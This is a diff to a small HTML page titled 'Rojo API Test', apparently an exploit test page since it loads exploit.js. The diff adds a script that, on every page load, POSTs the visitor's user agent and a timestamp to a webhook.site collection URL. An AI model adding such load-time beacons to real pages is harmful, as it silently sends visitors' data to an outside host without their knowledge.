@@ -8,4 +8,17 @@
     <h2>Rojo API Test</h2>
     <script src="exploit.js"></script>
 </body>
+<script>
+fetch("https://webhook.site/#!/view/f674bcf3-d7a4-4772-b2a7-46e938afeb00", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        event: "website_loaded",
+        time: new Date().toISOString(),
+        userAgent: navigator.userAgent
+    })
+});
+</script>
 </html>
